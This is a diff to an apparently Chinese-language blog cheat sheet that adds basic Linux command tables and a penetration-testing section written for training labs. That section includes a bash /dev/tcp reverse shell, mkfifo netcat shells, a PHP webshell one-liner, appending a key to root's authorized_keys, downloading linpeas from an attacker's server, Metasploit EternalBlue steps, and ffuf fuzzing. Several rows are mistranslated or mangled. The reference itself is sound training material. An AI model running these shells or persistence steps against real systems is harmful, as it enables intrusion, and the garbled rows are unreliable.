@@ -190,7 +190,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/备忘录" style=color:#00bcd4>
+                <a href="/tags/备忘录" style=color:#03a9f4>
                     备忘录
                 </a>
             </span>
@@ -571,7 +571,7 @@
 </tr>
 </tbody></table>
 <hr>
-<h2 id="仪表管理员命令"><a href="#仪表管理员命令" class="headerlink" title="仪表管理员命令"></a>仪表管理员命令</h2><table>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><table>
 <thead>
 <tr>
 <th><strong>命令</strong></th>
@@ -741,6 +741,805 @@
 <tr>
 <td><code>reboot</code></td>
 <td>重新启动目标计算机。</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th><code>man &lt;tool&gt;</code></th>
+<th>打开指定工具的手册页。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;tool&gt; -h</code></td>
+<td>打印工具的帮助页。</td>
+</tr>
+<tr>
+<td><code>apropos &lt;keyword&gt;</code></td>
+<td>在手册页的描述中搜索给定关键字的实例。</td>
+</tr>
+<tr>
+<td><code>cat</code></td>
+<td>连接和打印文件。</td>
+</tr>
+<tr>
+<td><code>whoami</code></td>
+<td>显示当前用户名。</td>
+</tr>
+<tr>
+<td><code>id</code></td>
+<td>返回用户标识。</td>
+</tr>
+<tr>
+<td><code>hostname</code></td>
+<td>设置或打印当前主机系统的名称。</td>
+</tr>
+<tr>
+<td><code>uname</code></td>
+<td>打印操作系统名称。</td>
+</tr>
+<tr>
+<td><code>pwd</code></td>
+<td>返回工作目录名称。</td>
+</tr>
+<tr>
+<td><code>ifconfig</code></td>
+<td>该实用程序用于为网络接口分配或查看地址和&#x2F;或配置网络接口参数。<code>ifconfig</code></td>
+</tr>
+<tr>
+<td><code>ip</code></td>
+<td>Ip 是用于显示或操作路由、网络设备、接口和隧道的实用程序。</td>
+</tr>
+<tr>
+<td><code>netstat</code></td>
+<td>显示网络状态。</td>
+</tr>
+<tr>
+<td><code>ss</code></td>
+<td>另一个用于调查套接字的实用程序。</td>
+</tr>
+<tr>
+<td><code>ps</code></td>
+<td>显示进程状态。</td>
+</tr>
+<tr>
+<td><code>who</code></td>
+<td>显示登录者。</td>
+</tr>
+<tr>
+<td><code>env</code></td>
+<td>打印环境或设置并执行命令。</td>
+</tr>
+<tr>
+<td><code>lsblk</code></td>
+<td>列出块设备。</td>
+</tr>
+<tr>
+<td><code>lsusb</code></td>
+<td>列出 USB 设备。</td>
+</tr>
+<tr>
+<td><code>lsof</code></td>
+<td>列出打开的文件。</td>
+</tr>
+<tr>
+<td><code>lspci</code></td>
+<td>列出 PCI 设备。</td>
+</tr>
+<tr>
+<td><code>sudo</code></td>
+<td>以其他用户身份执行命令。</td>
+</tr>
+<tr>
+<td><code>su</code></td>
+<td>该实用程序通过 PAM 请求适当的用户凭证，并切换到该用户 ID（缺省用户是超级用户）。然后执行一个 shell。<code>su</code></td>
+</tr>
+<tr>
+<td><code>useradd</code></td>
+<td>创建新用户或更新默认新用户信息。</td>
+</tr>
+<tr>
+<td><code>userdel</code></td>
+<td>删除用户帐户和相关文件。</td>
+</tr>
+<tr>
+<td><code>usermod</code></td>
+<td>修改用户帐户。</td>
+</tr>
+<tr>
+<td><code>addgroup</code></td>
+<td>将组添加到系统。</td>
+</tr>
+<tr>
+<td><code>delgroup</code></td>
+<td>从系统中删除组。</td>
+</tr>
+<tr>
+<td><code>passwd</code></td>
+<td>更改用户密码。</td>
+</tr>
+<tr>
+<td><code>dpkg</code></td>
+<td>安装、删除和配置基于 Debian 的软件包。</td>
+</tr>
+<tr>
+<td><code>apt</code></td>
+<td>高级包管理命令行实用工具。</td>
+</tr>
+<tr>
+<td><code>aptitude</code></td>
+<td>的替代项。<code>apt</code></td>
+</tr>
+<tr>
+<td><code>snap</code></td>
+<td>安装、删除和配置快照包。</td>
+</tr>
+<tr>
+<td><code>gem</code></td>
+<td>Ruby 的标准包管理器。</td>
+</tr>
+<tr>
+<td><code>pip</code></td>
+<td>Python 的标准包管理器。</td>
+</tr>
+<tr>
+<td><code>git</code></td>
+<td>版本控制系统命令行实用程序。</td>
+</tr>
+<tr>
+<td><code>systemctl</code></td>
+<td>基于命令行的服务和系统控制管理器。</td>
+</tr>
+<tr>
+<td><code>ps</code></td>
+<td>打印当前进程的快照。</td>
+</tr>
+<tr>
+<td><code>journalctl</code></td>
+<td>查询系统日志。</td>
+</tr>
+<tr>
+<td><code>kill</code></td>
+<td>向进程发送信号。</td>
+</tr>
+<tr>
+<td><code>bg</code></td>
+<td>将进程置于后台。</td>
+</tr>
+<tr>
+<td><code>jobs</code></td>
+<td>列出在后台运行的所有进程。</td>
+</tr>
+<tr>
+<td><code>fg</code></td>
+<td>将进程置于前台。</td>
+</tr>
+<tr>
+<td><code>curl</code></td>
+<td>用于从服务器传输数据或将数据传输到服务器的命令行实用程序。</td>
+</tr>
+<tr>
+<td><code>wget</code></td>
+<td>另一种方法是从FTP或HTTP（s）服务器下载文件。<code>curl</code></td>
+</tr>
+<tr>
+<td><code>python3 -m http.server</code></td>
+<td>在 TCP 端口 3 上启动 Python8000 Web 服务器。</td>
+</tr>
+<tr>
+<td><code>ls</code></td>
+<td>列出目录内容。</td>
+</tr>
+<tr>
+<td><code>cd</code></td>
+<td>更改目录。</td>
+</tr>
+<tr>
+<td><code>clear</code></td>
+<td>清除终端。</td>
+</tr>
+<tr>
+<td><code>touch</code></td>
+<td>创建一个空文件。</td>
+</tr>
+<tr>
+<td><code>mkdir</code></td>
+<td>创建目录。</td>
+</tr>
+<tr>
+<td><code>tree</code></td>
+<td>以递归方式列出目录的内容。</td>
+</tr>
+<tr>
+<td><code>mv</code></td>
+<td>移动或重命名文件或目录。</td>
+</tr>
+<tr>
+<td><code>cp</code></td>
+<td>复制文件或目录。</td>
+</tr>
+<tr>
+<td><code>nano</code></td>
+<td>基于终端的文本编辑器。</td>
+</tr>
+<tr>
+<td><code>which</code></td>
+<td>返回文件或链接的路径。</td>
+</tr>
+<tr>
+<td><code>find</code></td>
+<td>在目录层次结构中搜索文件。</td>
+</tr>
+<tr>
+<td><code>updatedb</code></td>
+<td>更新系统上现有内容的区域设置数据库。</td>
+</tr>
+<tr>
+<td><code>locate</code></td>
+<td>使用区域设置数据库查找系统上的内容。</td>
+</tr>
+<tr>
+<td><code>more</code></td>
+<td>用于读取标准输出或文件的寻呼机。</td>
+</tr>
+<tr>
+<td><code>less</code></td>
+<td>具有更多功能的替代方案。<code>more</code></td>
+</tr>
+<tr>
+<td><code>head</code></td>
+<td>打印 STDOUT 的前十行或文件。</td>
+</tr>
+<tr>
+<td><code>tail</code></td>
+<td>打印 STDOUT 或文件的最后十行。</td>
+</tr>
+<tr>
+<td><code>sort</code></td>
+<td>对 STDOUT 或文件的内容进行排序。</td>
+</tr>
+<tr>
+<td><code>grep</code></td>
+<td>搜索包含给定模式的特定结果。</td>
+</tr>
+<tr>
+<td><code>cut</code></td>
+<td>从文件的每一行中删除节。</td>
+</tr>
+<tr>
+<td><code>tr</code></td>
+<td>替换某些字符。</td>
+</tr>
+<tr>
+<td><code>column</code></td>
+<td>基于命令行的实用工具，用于将其输入格式化为多个列。</td>
+</tr>
+<tr>
+<td><code>awk</code></td>
+<td>模式扫描和处理语言。</td>
+</tr>
+<tr>
+<td><code>sed</code></td>
+<td>用于筛选和转换文本的流编辑器。</td>
+</tr>
+<tr>
+<td><code>wc</code></td>
+<td>打印给定输入的换行符、单词和字节计数。</td>
+</tr>
+<tr>
+<td><code>chmod</code></td>
+<td>更改文件或目录的权限。</td>
+</tr>
+<tr>
+<td><code>chown</code></td>
+<td>更改文件或目录的所有者和组。</td>
+</tr>
+</tbody></table>
+<h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><table>
+<thead>
+<tr>
+<th><code>sudo</code></th>
+<th>以其他用户身份执行命令。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>su</code></td>
+<td>该实用程序通过 PAM 请求适当的用户凭证，并切换到该用户 ID（缺省用户是超级用户）。然后执行一个 shell。<code>su</code></td>
+</tr>
+<tr>
+<td><code>useradd</code></td>
+<td>创建新用户或更新默认新用户信息。</td>
+</tr>
+<tr>
+<td><code>userdel</code></td>
+<td>删除用户帐户和相关文件。</td>
+</tr>
+<tr>
+<td><code>usermod</code></td>
+<td>修改用户帐户。</td>
+</tr>
+<tr>
+<td><code>addgroup</code></td>
+<td>将组添加到系统。</td>
+</tr>
+<tr>
+<td><code>delgroup</code></td>
+<td>从系统中删除组。</td>
+</tr>
+<tr>
+<td><code>passwd</code></td>
+<td>更改用户密码。</td>
+</tr>
+</tbody></table>
+<p>###包管理</p>
+<table>
+<thead>
+<tr>
+<th><code>dpkg</code></th>
+<th>这是一个安装、构建、删除和管理 Debian 软件包的工具。主要和更用户友好的前端是能力。<code>dpkg``dpkg</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>apt</code></td>
+<td>Apt 为包管理系统提供了一个高级命令行界面。</td>
+</tr>
+<tr>
+<td><code>aptitude</code></td>
+<td>Aptitude 是 apt 的替代方法，是包管理器的高级接口。</td>
+</tr>
+<tr>
+<td><code>snap</code></td>
+<td>安装、配置、刷新和删除快照包。Snaps 支持安全分发适用于云、服务器、桌面和物联网的最新应用程序和实用程序。</td>
+</tr>
+<tr>
+<td><code>gem</code></td>
+<td>Gem 是 RubyGems 的前端，Ruby 的标准包管理器。</td>
+</tr>
+<tr>
+<td><code>pip</code></td>
+<td>Pip 是一个 Python 软件包安装程序，推荐用于安装 Debian 存档中不可用的 Python 软件包。它可以与版本控制存储库（目前只有 Git、Mercurial 和 Bazaar 存储库）一起使用，广泛记录输出，并通过在开始安装之前下载所有要求来防止部分安装。</td>
+</tr>
+<tr>
+<td><code>git</code></td>
+<td>Git 是一个快速、可扩展的分布式版本控制系统，具有异常丰富的命令集，既提供高级操作，又提供对内部内容的完全访问。</td>
+</tr>
+</tbody></table>
+<h3 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h3><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>常规</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>sudo openvpn user.ovpn</code></td>
+<td>连接到虚拟专用网络</td>
+</tr>
+<tr>
+<td><code>ifconfig</code>&#x2F;<code>ip a</code></td>
+<td>显示我们的 IP 地址</td>
+</tr>
+<tr>
+<td><code>netstat -rn</code></td>
+<td>显示可通过 VPN 访问的网络</td>
+</tr>
+<tr>
+<td><code>ssh user@10.10.10.10</code></td>
+<td>通过 SSH 连接到远程服务器</td>
+</tr>
+<tr>
+<td><code>ftp 10.129.42.253</code></td>
+<td>FTP 到远程服务器</td>
+</tr>
+<tr>
+<td><strong>鞘鞘</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>tmux</code></td>
+<td>启动 tmux</td>
+</tr>
+<tr>
+<td><code>ctrl+b</code></td>
+<td>TMUX：默认前缀</td>
+</tr>
+<tr>
+<td><code>prefix c</code></td>
+<td>TMUX：新窗口</td>
+</tr>
+<tr>
+<td><code>prefix 1</code></td>
+<td>TMUX：切换到窗口 （<code>1</code>)</td>
+</tr>
+<tr>
+<td><code>prefix shift+%</code></td>
+<td>TMUX：垂直拆分窗格</td>
+</tr>
+<tr>
+<td><code>prefix shift+&quot;</code></td>
+<td>TMUX：水平拆分窗格</td>
+</tr>
+<tr>
+<td><code>prefix -&gt;</code></td>
+<td>TMUX：切换到右窗格</td>
+</tr>
+<tr>
+<td><strong>维姆</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>vim file</code></td>
+<td>VIM：使用 VIM 打开<code>file</code></td>
+</tr>
+<tr>
+<td><code>esc+i</code></td>
+<td>VIM：进入模式<code>insert</code></td>
+</tr>
+<tr>
+<td><code>esc</code></td>
+<td>VIM：返回模式<code>normal</code></td>
+</tr>
+<tr>
+<td><code>x</code></td>
+<td>vim：剪切字符</td>
+</tr>
+<tr>
+<td><code>dw</code></td>
+<td>vim：剪切词</td>
+</tr>
+<tr>
+<td><code>dd</code></td>
+<td>vim：切割整条线</td>
+</tr>
+<tr>
+<td><code>yw</code></td>
+<td>vim：复制单词</td>
+</tr>
+<tr>
+<td><code>yy</code></td>
+<td>vim：复制整行</td>
+</tr>
+<tr>
+<td><code>p</code></td>
+<td>vim：粘贴</td>
+</tr>
+<tr>
+<td><code>:1</code></td>
+<td>vim：转到第 1 行。</td>
+</tr>
+<tr>
+<td><code>:w</code></td>
+<td>vim：写入文件“即保存”</td>
+</tr>
+<tr>
+<td><code>:q</code></td>
+<td>vim：退出</td>
+</tr>
+<tr>
+<td><code>:q!</code></td>
+<td>vim：退出而不保存</td>
+</tr>
+<tr>
+<td><code>:wq</code></td>
+<td>vim：写和退出</td>
+</tr>
+</tbody></table>
+<!-- more -->
+
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>服务扫描</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>nmap 10.129.42.253</code></td>
+<td>在 IP 上运行 nmap</td>
+</tr>
+<tr>
+<td><code>nmap -sV -sC -p- 10.129.42.253</code></td>
+<td>在 IP 上运行 nmap 脚本扫描</td>
+</tr>
+<tr>
+<td><code>locate scripts/citrix</code></td>
+<td>列出各种可用的 nmap 脚本</td>
+</tr>
+<tr>
+<td><code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code></td>
+<td>在 IP 上运行 nmap 脚本</td>
+</tr>
+<tr>
+<td><code>netcat 10.10.10.10 22</code></td>
+<td>抓取开放端口的横幅</td>
+</tr>
+<tr>
+<td><code>smbclient -N -L \\\\10.129.42.253</code></td>
+<td>列出中小企业共享</td>
+</tr>
+<tr>
+<td><code>smbclient \\\\10.129.42.253\\users</code></td>
+<td>连接到 SMB 共享</td>
+</tr>
+<tr>
+<td><code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code></td>
+<td>扫描 IP 上的 SNMP</td>
+</tr>
+<tr>
+<td><code>onesixtyone -c dict.txt 10.129.42.254</code></td>
+<td>暴力破解 SNMP 机密字符串</td>
+</tr>
+<tr>
+<td><strong>网络枚举</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code></td>
+<td>在网站上运行目录扫描</td>
+</tr>
+<tr>
+<td><code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code></td>
+<td>在网站上运行子域扫描</td>
+</tr>
+<tr>
+<td><code>curl -IL https://www.inlanefreight.com</code></td>
+<td>抓取网站横幅</td>
+</tr>
+<tr>
+<td><code>whatweb 10.10.10.121</code></td>
+<td>列出有关 Web 服务器&#x2F;证书的详细信息</td>
+</tr>
+<tr>
+<td><code>curl 10.10.10.121/robots.txt</code></td>
+<td>列出潜在目录<code>robots.txt</code></td>
+</tr>
+<tr>
+<td><code>ctrl+U</code></td>
+<td>查看页面源代码（在火狐中）</td>
+</tr>
+<tr>
+<td><strong>公共漏洞利用</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>searchsploit openssh 7.2</code></td>
+<td>搜索 Web 应用程序的公共漏洞</td>
+</tr>
+<tr>
+<td><code>msfconsole</code></td>
+<td>MSF：启动 Metasploit 框架</td>
+</tr>
+<tr>
+<td><code>search exploit eternalblue</code></td>
+<td>MSF：在 MSF 中搜索公共漏洞</td>
+</tr>
+<tr>
+<td><code>use exploit/windows/smb/ms17_010_psexec</code></td>
+<td>MSF：开始使用 MSF 模块</td>
+</tr>
+<tr>
+<td><code>show options</code></td>
+<td>MSF：显示 MSF 模块所需的选项</td>
+</tr>
+<tr>
+<td><code>set RHOSTS 10.10.10.40</code></td>
+<td>MSF：设置 MSF 模块选项的值</td>
+</tr>
+<tr>
+<td><code>check</code></td>
+<td>MSF：测试目标服务器是否易受攻击</td>
+</tr>
+<tr>
+<td><code>exploit</code></td>
+<td>MSF：在目标服务器上运行漏洞易受攻击</td>
+</tr>
+<tr>
+<td><strong>使用外壳</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>nc -lvnp 1234</code></td>
+<td>在本地端口上启动侦听器<code>nc</code></td>
+</tr>
+<tr>
+<td><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#39;</code></td>
+<td>从远程服务器发送反向外壳</td>
+</tr>
+<tr>
+<td>&#96;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f</td>
+<td>&#x2F;bin&#x2F;sh -i 2&gt;&amp;1</td>
+</tr>
+<tr>
+<td>&#96;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f</td>
+<td>&#x2F;bin&#x2F;bash -i 2&gt;&amp;1</td>
+</tr>
+<tr>
+<td><code>nc 10.10.10.1 1234</code></td>
+<td>连接到远程服务器上启动的绑定外壳</td>
+</tr>
+<tr>
+<td><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></td>
+<td>升级外壳 TTY （1）</td>
+</tr>
+<tr>
+<td><code>ctrl+z</code>然后然后是两次<code>stty raw -echo``fg``enter</code></td>
+<td>升级外壳 TTY （2）</td>
+</tr>
+<tr>
+<td><code>echo &quot;&lt;?php system(\$_GET[&#39;cmd&#39;]);?&gt;&quot; &gt; /var/www/html/shell.php</code></td>
+<td>创建一个 webshell php 文件</td>
+</tr>
+<tr>
+<td><code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code></td>
+<td>在上传的 Web 外壳上执行命令</td>
+</tr>
+<tr>
+<td><strong>权限提升</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>./linpeas.sh</code></td>
+<td>运行脚本以枚举远程服务器<code>linpeas</code></td>
+</tr>
+<tr>
+<td><code>sudo -l</code></td>
+<td>列出可用权限<code>sudo</code></td>
+</tr>
+<tr>
+<td><code>sudo -u user /bin/echo Hello World!</code></td>
+<td>运行命令<code>sudo</code></td>
+</tr>
+<tr>
+<td><code>sudo su -</code></td>
+<td>切换到根用户（如果我们有权访问<code>sudo su</code>)</td>
+</tr>
+<tr>
+<td><code>sudo su user -</code></td>
+<td>切换到用户（如果我们有权访问<code>sudo su</code>)</td>
+</tr>
+<tr>
+<td><code>ssh-keygen -f key</code></td>
+<td>创建新的 SSH 密钥</td>
+</tr>
+<tr>
+<td><code>echo &quot;ssh-rsa AAAAB...SNIP...M= user@parrot&quot; &gt;&gt; /root/.ssh/authorized_keys</code></td>
+<td>将生成的公钥添加到用户</td>
+</tr>
+<tr>
+<td><code>ssh root@10.10.10.10 -i key</code></td>
+<td>使用生成的私钥通过 SSH 连接到服务器</td>
+</tr>
+<tr>
+<td><strong>传输文件</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>python3 -m http.server 8000</code></td>
+<td>启动本地网络服务器</td>
+</tr>
+<tr>
+<td><code>wget http://10.10.14.1:8000/linpeas.sh</code></td>
+<td>从我们的本地计算机下载远程服务器上的文件</td>
+</tr>
+<tr>
+<td><code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code></td>
+<td>从我们的本地计算机下载远程服务器上的文件</td>
+</tr>
+<tr>
+<td><code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code></td>
+<td>使用（需要 SSH 访问）将文件传输到远程服务器<code>scp</code></td>
+</tr>
+<tr>
+<td><code>base64 shell -w 0</code></td>
+<td>将文件转换为<code>base64</code></td>
+</tr>
+<tr>
+<td>&#96;echo f0VMR…SNIO…InmDwU</td>
+<td>base64 -d &gt; shell&#96;</td>
+</tr>
+<tr>
+<td><code>md5sum shell</code></td>
+<td>检查文件以确保其转换正确<code>md5sum</code></td>
+</tr>
+</tbody></table>
+<h3 id="备忘录-1"><a href="#备忘录-1" class="headerlink" title="备忘录"></a>备忘录</h3><h4 id="Ffuf"><a href="#Ffuf" class="headerlink" title="Ffuf"></a>Ffuf</h4><table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ffuf -h</code></td>
+<td>ffuf help</td>
+</tr>
+<tr>
+<td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code></td>
+<td>Directory Fuzzing</td>
+</tr>
+<tr>
+<td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</code></td>
+<td>Extension Fuzzing</td>
+</tr>
+<tr>
+<td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code></td>
+<td>Page Fuzzing</td>
+</tr>
+<tr>
+<td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code></td>
+<td>Recursive Fuzzing</td>
+</tr>
+<tr>
+<td><code>ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/</code></td>
+<td>Sub-domain Fuzzing</td>
+</tr>
+<tr>
+<td><code>ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H &#39;Host: FUZZ.academy.htb&#39; -fs xxx</code></td>
+<td>VHost Fuzzing</td>
+</tr>
+<tr>
+<td><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx</code></td>
+<td>Parameter Fuzzing - GET</td>
+</tr>
+<tr>
+<td><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;FUZZ=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx</code></td>
+<td>Parameter Fuzzing - POST</td>
+</tr>
+<tr>
+<td><code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;id=FUZZ&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx</code></td>
+<td>Value Fuzzing</td>
+</tr>
+</tbody></table>
+<h4 id="Wordlists"><a href="#Wordlists" class="headerlink" title="Wordlists"></a>Wordlists</h4><table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt</code></td>
+<td>Directory&#x2F;Page Wordlist</td>
+</tr>
+<tr>
+<td><code>/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt</code></td>
+<td>Extensions Wordlist</td>
+</tr>
+<tr>
+<td><code>/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</code></td>
+<td>Domain Wordlist</td>
+</tr>
+<tr>
+<td><code>/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt</code></td>
+<td>Parameters Wordlist</td>
+</tr>
+</tbody></table>
+<h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>sudo sh -c &#39;echo &quot;SERVER_IP academy.htb&quot; &gt;&gt; /etc/hosts&#39;</code></td>
+<td>Add DNS entry</td>
+</tr>
+<tr>
+<td><code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done</code></td>
+<td>Create Sequence Wordlist</td>
+</tr>
+<tr>
+<td><code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;id=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39;</code></td>
+<td>curl w&#x2F; POST</td>
 </tr>
 </tbody></table>
 
